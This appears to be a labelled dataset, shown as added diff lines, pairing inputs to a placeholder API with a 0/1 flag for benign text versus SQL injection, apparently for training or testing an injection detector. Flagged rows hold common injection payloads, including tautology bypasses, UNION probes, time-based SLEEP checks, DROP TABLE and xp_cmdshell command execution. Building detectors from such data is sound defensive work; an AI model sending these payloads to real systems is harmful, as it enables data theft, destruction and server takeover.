+http://vuln.com/api,input,contact_us330,0
+http://vuln.com/api,input,' OR '' = ''142,1
+http://vuln.com/api,input,download_report173,0
+http://vuln.com/api,input,invoice_2024193,0
+http://vuln.com/api,input,invoice_2024198,0
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--185,1
+http://vuln.com/api,input,admin180,0
+http://vuln.com/api,input,invoice_2024369,0
+http://vuln.com/api,input,download_report254,0
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--477,1
+http://vuln.com/api,input,' OR NOT 1=2 --49,1
+http://vuln.com/api,input,' OR NOT 1=2 --499,1
+http://vuln.com/api,input,export_data356,0
+http://vuln.com/api,input,invoice_2024484,0
+http://vuln.com/api,input,feedback_form158,0
+http://vuln.com/api,input,contact_us406,0
+http://vuln.com/api,input,' OR 1=1#406,1
+http://vuln.com/api,input,' OR '' = ''16,1
+http://vuln.com/api,input,contact_us371,0
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--392,1
+http://vuln.com/api,input,email=admin@example.com58,0
+http://vuln.com/api,input,' OR '' = ''271,1
+http://vuln.com/api,input,export_data306,0
+http://vuln.com/api,input,update_profile352,0
+http://vuln.com/api,input,search_item109,0
+http://vuln.com/api,input,feedback_form36,0
+http://vuln.com/api,input,' AND SLEEP(5); --482,1
+http://vuln.com/api,input,letmein436,0
+http://vuln.com/api,input,' OR '' = ''483,1
+http://vuln.com/api,input,' OR NOT 1=2 --374,1
+http://vuln.com/api,input,' OR 1=1/*92,1
+http://vuln.com/api,input,product_list166,0
+http://vuln.com/api,input,invoice_2024101,0
+http://vuln.com/api,input,feedback_form203,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --126,1
+http://vuln.com/api,input,download_report113,0
+http://vuln.com/api,input,letmein94,0
+http://vuln.com/api,input,logout186,0
+http://vuln.com/api,input,export_data381,0
+http://vuln.com/api,input,' OR '' = ''343,1
+http://vuln.com/api,input,' OR 'a'='a77,1
+http://vuln.com/api,input,admin285,0
+http://vuln.com/api,input,letmein327,0
+http://vuln.com/api,input,' OR 1=1 --365,1
+http://vuln.com/api,input,product_list397,0
+http://vuln.com/api,input,' OR '' = ''257,1
+http://vuln.com/api,input,admin' --113,1
+http://vuln.com/api,input,logout422,0
+http://vuln.com/api,input,logout125,0
+http://vuln.com/api,input,' OR 1=1/*109,1
+http://vuln.com/api,input,' OR 'a'='a216,1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --239",1
+http://vuln.com/api,input,' OR 1=1/*344,1
+http://vuln.com/api,input,admin' --278,1
+http://vuln.com/api,input,reset_password337,0
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--262,1
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--356,1
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--409,1
+http://vuln.com/api,input,email=admin@example.com157,0
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --368",1
+http://vuln.com/api,input,product_list307,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --175,1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --84",1
+http://vuln.com/api,input,contact_us95,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --174,1
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --43",1
+http://vuln.com/api,input,' OR NOT 1=2 --254,1
+http://vuln.com/api,input,update_profile396,0
+http://vuln.com/api,input,' UNION ALL SELECT NULL--232,1
+http://vuln.com/api,input,reset_password78,0
+http://vuln.com/api,input,export_data390,0
+http://vuln.com/api,input,export_data366,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --327,1
+http://vuln.com/api,input,' OR 'a'='a421,1
+http://vuln.com/api,input,' OR NOT 1=2 --103,1
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --264,1
+http://vuln.com/api,input,admin124,0
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--281,1
+http://vuln.com/api,input,reset_password232,0
+http://vuln.com/api,input,john349,0
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --362",1
+http://vuln.com/api,input,reset_password282,0
+http://vuln.com/api,input,contact_us259,0
+http://vuln.com/api,input,admin' --116,1
+http://vuln.com/api,input,john442,0
+http://vuln.com/api,input,'; DROP TABLE users; --105,1
+http://vuln.com/api,input,product_list84,0
+http://vuln.com/api,input,' OR 'a'='a391,1
+http://vuln.com/api,input,' AND SLEEP(5); --388,1
+http://vuln.com/api,input,' OR 'a'='a280,1
+http://vuln.com/api,input,update_profile294,0
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --207",1
+http://vuln.com/api,input,letmein161,0
+http://vuln.com/api,input,admin' --151,1
+http://vuln.com/api,input,logout382,0
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --143,1
+http://vuln.com/api,input,' OR '' = ''386,1
+http://vuln.com/api,input,' OR NOT 1=2 --338,1
+http://vuln.com/api,input,' OR 1=1#190,1
+http://vuln.com/api,input,' OR 1=1 --122,1
+http://vuln.com/api,input,product_list376,0
+http://vuln.com/api,input,' OR 1=1#361,1
+http://vuln.com/api,input,' OR '' = ''152,1
+http://vuln.com/api,input,admin409,0
+http://vuln.com/api,input,export_data214,0
+http://vuln.com/api,input,download_report258,0
+http://vuln.com/api,input,hello12386,0
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --60",1
+http://vuln.com/api,input,reset_password128,0
+http://vuln.com/api,input,invoice_2024477,0
+http://vuln.com/api,input,contact_us14,0
+http://vuln.com/api,input,' OR NOT 1=2 --303,1
+http://vuln.com/api,input,hello123305,0
+http://vuln.com/api,input,update_profile235,0
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --325,1
+http://vuln.com/api,input,email=admin@example.com23,0
+http://vuln.com/api,input,' OR NOT 1=2 --178,1
+http://vuln.com/api,input,' AND SLEEP(5); --465,1
+http://vuln.com/api,input,reset_password322,0
+http://vuln.com/api,input,' AND SLEEP(5); --287,1
+http://vuln.com/api,input,' OR 1=1#263,1
+http://vuln.com/api,input,letmein257,0
+http://vuln.com/api,input,' OR 1=1 --405,1
+http://vuln.com/api,input,admin' --67,1
+http://vuln.com/api,input,export_data93,0
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--220,1
+http://vuln.com/api,input,' OR 1=1 --439,1
+http://vuln.com/api,input,' OR 1=1#333,1
+http://vuln.com/api,input,logout211,0
+http://vuln.com/api,input,admin339,0
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --61,1
+http://vuln.com/api,input,invoice_20242,0
+http://vuln.com/api,input,' OR '' = ''209,1
+http://vuln.com/api,input,product_list444,0
+http://vuln.com/api,input,' OR NOT 1=2 --480,1
+http://vuln.com/api,input,' OR 1=1/*396,1
+http://vuln.com/api,input,' OR 'a'='a381,1
+http://vuln.com/api,input,email=admin@example.com28,0
+http://vuln.com/api,input,email=admin@example.com309,0
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --101",1
+http://vuln.com/api,input,admin' --145,1
+http://vuln.com/api,input,reset_password271,0
+http://vuln.com/api,input,email=admin@example.com385,0
+http://vuln.com/api,input,invoice_2024247,0
+http://vuln.com/api,input,email=admin@example.com314,0
+http://vuln.com/api,input,invoice_2024446,0
+http://vuln.com/api,input,reset_password1,0
+http://vuln.com/api,input,search_item224,0
+http://vuln.com/api,input,feedback_form165,0
+http://vuln.com/api,input,export_data41,0
+http://vuln.com/api,input,' OR '' = ''425,1
+http://vuln.com/api,input,' UNION ALL SELECT NULL--247,1
+http://vuln.com/api,input,' OR 1=1 --445,1
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --379",1
+http://vuln.com/api,input,reset_password98,0
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --50,1
+http://vuln.com/api,input,logout469,0
+http://vuln.com/api,input,hello123488,0
+http://vuln.com/api,input,' OR NOT 1=2 --378,1
+http://vuln.com/api,input,reset_password242,0
+http://vuln.com/api,input,' UNION ALL SELECT NULL--416,1
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --308",1
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --236,1
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --222",1
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --377,1
+http://vuln.com/api,input,contact_us24,0
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--31,1
+http://vuln.com/api,input,' OR 'a'='a317,1
+http://vuln.com/api,input,' OR '' = ''464,1
+http://vuln.com/api,input,download_report449,0
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--41,1
+http://vuln.com/api,input,hello12340,0
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --500,1
+http://vuln.com/api,input,product_list430,0
+http://vuln.com/api,input,hello123426,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --293,1
+http://vuln.com/api,input,invoice_2024308,0
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --2",1
+http://vuln.com/api,input,update_profile329,0
+http://vuln.com/api,input,'; DROP TABLE users; --260,1
+http://vuln.com/api,input,download_report159,0
+http://vuln.com/api,input,export_data32,0
+http://vuln.com/api,input,john140,0
+http://vuln.com/api,input,reset_password104,0
+http://vuln.com/api,input,' AND SLEEP(5); --273,1
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --231,1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --490",1
+http://vuln.com/api,input,admin346,0
+http://vuln.com/api,input,invoice_2024347,0
+http://vuln.com/api,input,hello123218,0
+http://vuln.com/api,input,' OR 1=1 --241,1
+http://vuln.com/api,input,' AND SLEEP(5); --184,1
+http://vuln.com/api,input,logout147,0
+http://vuln.com/api,input,logout405,0
+http://vuln.com/api,input,admin400,0
+http://vuln.com/api,input,admin' --19,1
+http://vuln.com/api,input,update_profile370,0
+http://vuln.com/api,input,reset_password153,0
+http://vuln.com/api,input,logout4,0
+http://vuln.com/api,input,' OR 1=1/*432,1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --218",1
+http://vuln.com/api,input,' OR '' = ''393,1
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --468,1
+http://vuln.com/api,input,' OR 1=1/*215,1
+http://vuln.com/api,input,hello123393,0
+http://vuln.com/api,input,logout345,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --389,1
+http://vuln.com/api,input,' OR 1=1/*128,1
+http://vuln.com/api,input,' OR 1=1/*412,1
+http://vuln.com/api,input,product_list136,0
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --140,1
+http://vuln.com/api,input,invoice_202467,0
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --401",1
+http://vuln.com/api,input,' UNION ALL SELECT NULL--373,1
+http://vuln.com/api,input,'; DROP TABLE users; --302,1
+http://vuln.com/api,input,invoice_2024459,0
+http://vuln.com/api,input,' OR 'a'='a112,1
+http://vuln.com/api,input,update_profile317,0
+http://vuln.com/api,input,reset_password238,0
+http://vuln.com/api,input,export_data155,0
+http://vuln.com/api,input,' UNION ALL SELECT NULL--89,1
+http://vuln.com/api,input,product_list455,0
+http://vuln.com/api,input,export_data9,0
+http://vuln.com/api,input,contact_us45,0
+http://vuln.com/api,input,contact_us245,0
+http://vuln.com/api,input,john482,0
+http://vuln.com/api,input,reset_password416,0
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --394",1
+http://vuln.com/api,input,' OR 1=1#59,1
+http://vuln.com/api,input,product_list252,0
+http://vuln.com/api,input,letmein289,0
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--40,1
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --73",1
+http://vuln.com/api,input,contact_us89,0
+http://vuln.com/api,input,' OR 1=1/*150,1
+http://vuln.com/api,input,email=admin@example.com202,0
+http://vuln.com/api,input,letmein392,0
+http://vuln.com/api,input,' AND SLEEP(5); --364,1
+http://vuln.com/api,input,' UNION ALL SELECT NULL--403,1
+http://vuln.com/api,input,feedback_form176,0
+http://vuln.com/api,input,product_list496,0
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --478",1
+http://vuln.com/api,input,search_item190,0
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --385,1
+http://vuln.com/api,input,admin' --167,1
+http://vuln.com/api,input,'; DROP TABLE users; --347,1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --328",1
+http://vuln.com/api,input,'; DROP TABLE users; --429,1
+http://vuln.com/api,input,' OR NOT 1=2 --141,1
+http://vuln.com/api,input,' UNION ALL SELECT NULL--74,1
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --470,1
+http://vuln.com/api,input,' OR '' = ''294,1
+http://vuln.com/api,input,letmein141,0
+http://vuln.com/api,input,admin' --111,1
+http://vuln.com/api,input,update_profile260,0
+http://vuln.com/api,input,john420,0
+http://vuln.com/api,input,letmein447,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --340,1
+http://vuln.com/api,input,admin' --134,1
+http://vuln.com/api,input,' OR 1=1 --181,1
+http://vuln.com/api,input,email=admin@example.com489,0
+http://vuln.com/api,input,feedback_form177,0
+http://vuln.com/api,input,letmein154,0
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --235",1
+http://vuln.com/api,input,product_list493,0
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --75",1
+http://vuln.com/api,input,logout272,0
+http://vuln.com/api,input,admin' --492,1
+http://vuln.com/api,input,invoice_2024205,0
+http://vuln.com/api,input,' OR '' = ''10,1
+http://vuln.com/api,input,' OR 1=1/*227,1
+http://vuln.com/api,input,search_item334,0
+http://vuln.com/api,input,' OR '' = ''71,1
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --479,1
+http://vuln.com/api,input,' OR 1=1#135,1
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--123,1
+http://vuln.com/api,input,product_list273,0
+http://vuln.com/api,input,feedback_form85,0
+http://vuln.com/api,input,product_list498,0
+http://vuln.com/api,input,john434,0
+http://vuln.com/api,input,' AND SLEEP(5); --339,1
+http://vuln.com/api,input,' UNION ALL SELECT NULL--137,1
+http://vuln.com/api,input,reset_password398,0
+http://vuln.com/api,input,export_data354,0
+http://vuln.com/api,input,product_list460,0
+http://vuln.com/api,input,' OR 1=1 --38,1
+http://vuln.com/api,input,download_report391,0
+http://vuln.com/api,input,john470,0
+http://vuln.com/api,input,invoice_2024375,0
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --384",1
+http://vuln.com/api,input,update_profile421,0
+http://vuln.com/api,input,contact_us458,0
+http://vuln.com/api,input,' OR 1=1 --359,1
+http://vuln.com/api,input,' OR 1=1#159,1
+http://vuln.com/api,input,invoice_2024123,0
+http://vuln.com/api,input,download_report119,0
+http://vuln.com/api,input,' OR NOT 1=2 --213,1
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --298",1
+http://vuln.com/api,input,letmein486,0
+http://vuln.com/api,input,hello123451,0
+http://vuln.com/api,input,product_list137,0
+http://vuln.com/api,input,product_list363,0
+http://vuln.com/api,input,admin' --96,1
+http://vuln.com/api,input,invoice_2024429,0
+http://vuln.com/api,input,contact_us174,0
+http://vuln.com/api,input,hello123248,0
+http://vuln.com/api,input,logout261,0
+http://vuln.com/api,input,export_data417,0
+http://vuln.com/api,input,download_report357,0
+http://vuln.com/api,input,update_profile46,0
+http://vuln.com/api,input,email=admin@example.com219,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --211,1
+http://vuln.com/api,input,letmein213,0
+http://vuln.com/api,input,hello123311,0
+http://vuln.com/api,input,' AND SLEEP(5); --295,1
+http://vuln.com/api,input,letmein142,0
+http://vuln.com/api,input,' OR 1=1 --240,1
+http://vuln.com/api,input,contact_us102,0
+http://vuln.com/api,input,' OR 1=1/*12,1
+http://vuln.com/api,input,feedback_form5,0
+http://vuln.com/api,input,logout283,0
+http://vuln.com/api,input,' OR 'a'='a496,1
+http://vuln.com/api,input,' AND SLEEP(5); --76,1
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --252,1
+http://vuln.com/api,input,' OR 1=1/*256,1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --208",1
+http://vuln.com/api,input,' AND SLEEP(5); --166,1
+http://vuln.com/api,input,' OR 1=1#471,1
+http://vuln.com/api,input,logout443,0
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --334,1
+http://vuln.com/api,input,product_list178,0
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --266,1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --426",1
+http://vuln.com/api,input,export_data479,0
+http://vuln.com/api,input,contact_us229,0
+http://vuln.com/api,input,reset_password348,0
+http://vuln.com/api,input,export_data428,0
+http://vuln.com/api,input,invoice_2024389,0
+http://vuln.com/api,input,' OR 1=1 --301,1
+http://vuln.com/api,input,export_data467,0
+http://vuln.com/api,input,search_item30,0
+http://vuln.com/api,input,' UNION ALL SELECT NULL--269,1
+http://vuln.com/api,input,' OR NOT 1=2 --91,1
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --304",1
+http://vuln.com/api,input,logout240,0
+http://vuln.com/api,input,' OR 1=1/*18,1
+http://vuln.com/api,input,hello123162,0
+http://vuln.com/api,input,' OR 'a'='a172,1
+http://vuln.com/api,input,admin433,0
+http://vuln.com/api,input,' OR 1=1/*354,1
+http://vuln.com/api,input,admin' --21,1
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--129,1
+http://vuln.com/api,input,email=admin@example.com43,0
+http://vuln.com/api,input,letmein453,0
+http://vuln.com/api,input,john90,0
+http://vuln.com/api,input,letmein478,0
+http://vuln.com/api,input,export_data395,0
+http://vuln.com/api,input,admin146,0
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --341",1
+http://vuln.com/api,input,search_item340,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --58,1
+http://vuln.com/api,input,john39,0
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--413,1
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --36,1
+http://vuln.com/api,input,' OR 1=1#168,1
+http://vuln.com/api,input,email=admin@example.com149,0
+http://vuln.com/api,input,' OR 1=1#157,1
+http://vuln.com/api,input,email=admin@example.com183,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --127,1
+http://vuln.com/api,input,invoice_2024296,0
+http://vuln.com/api,input,' OR 1=1#163,1
+http://vuln.com/api,input,' OR '' = ''311,1
+http://vuln.com/api,input,reset_password187,0
+http://vuln.com/api,input,update_profile231,0
+http://vuln.com/api,input,download_report220,0
+http://vuln.com/api,input,'; DROP TABLE users; --118,1
+http://vuln.com/api,input,contact_us72,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --404,1
+http://vuln.com/api,input,admin' --206,1
+http://vuln.com/api,input,download_report150,0
+http://vuln.com/api,input,product_list270,0
+http://vuln.com/api,input,' OR 'a'='a288,1
+http://vuln.com/api,input,admin' --305,1
+http://vuln.com/api,input,'; DROP TABLE users; --312,1
+http://vuln.com/api,input,search_item328,0
+http://vuln.com/api,input,search_item225,0
+http://vuln.com/api,input,feedback_form151,0
+http://vuln.com/api,input,' OR 1=1#472,1
+http://vuln.com/api,input,product_list170,0
+http://vuln.com/api,input,email=admin@example.com364,0
+http://vuln.com/api,input,email=admin@example.com490,0
+http://vuln.com/api,input,john297,0
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --243,1
+http://vuln.com/api,input,download_report60,0
+http://vuln.com/api,input,' OR NOT 1=2 --228,1
+http://vuln.com/api,input,hello123365,0
+http://vuln.com/api,input,export_data495,0
+http://vuln.com/api,input,' OR '' = ''242,1
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --87,1
+http://vuln.com/api,input,admin88,0
+http://vuln.com/api,input,' OR 1=1#363,1
+http://vuln.com/api,input,' OR NOT 1=2 --320,1
+http://vuln.com/api,input,feedback_form448,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --53,1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --3",1
+http://vuln.com/api,input,'; DROP TABLE users; --154,1
+http://vuln.com/api,input,' OR 'a'='a202,1
+http://vuln.com/api,input,download_report237,0
+http://vuln.com/api,input,search_item267,0
+http://vuln.com/api,input,search_item92,0
+http://vuln.com/api,input,' OR NOT 1=2 --475,1
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --414",1
+http://vuln.com/api,input,' OR 1=1#376,1
+http://vuln.com/api,input,invoice_2024464,0
+http://vuln.com/api,input,invoice_202447,0
+http://vuln.com/api,input,invoice_2024472,0
+http://vuln.com/api,input,product_list194,0
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --182,1
+http://vuln.com/api,input,export_data226,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --422,1
